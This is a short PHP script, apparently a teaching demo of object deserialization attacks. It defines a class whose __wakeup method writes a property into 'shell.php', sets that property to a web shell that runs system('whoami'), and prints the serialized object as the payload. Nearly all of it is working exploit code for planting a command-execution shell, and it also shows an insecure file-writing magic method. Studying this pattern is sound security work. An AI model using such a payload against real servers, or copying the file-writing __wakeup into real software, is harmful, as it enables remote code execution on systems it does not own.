<?php    class test{
        var $test = '123';
        function __wakeup(){
            $fp = fopen("shell.php","w") ;
            fwrite($fp,$this->test);
            fclose($fp);
        }
    }    $class4 = new test();    $class4->test = "<?php system('whoami') ?>";    $class4_ser = serialize($class4);
    print_r($class4_ser);?>